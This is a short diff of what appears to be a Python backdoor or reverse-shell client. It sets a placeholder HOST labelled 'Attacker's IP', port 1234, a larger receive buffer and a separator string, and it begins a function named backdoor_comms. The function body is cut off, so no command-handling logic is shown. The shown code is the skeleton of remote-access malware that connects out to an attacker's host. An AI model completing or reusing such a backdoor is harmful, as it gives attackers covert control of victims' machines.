@@ -1,9 +1,9 @@
 import socket
 import sys
 
-HOST = "000.000.000.000"
+HOST = "000.000.000.000" # Attacker's IP
 PORT = 1234
-BUFFER = 2024
+BUFFER = 4096
 SEP = "<sep>"
 
 def backdoor_comms(conn):
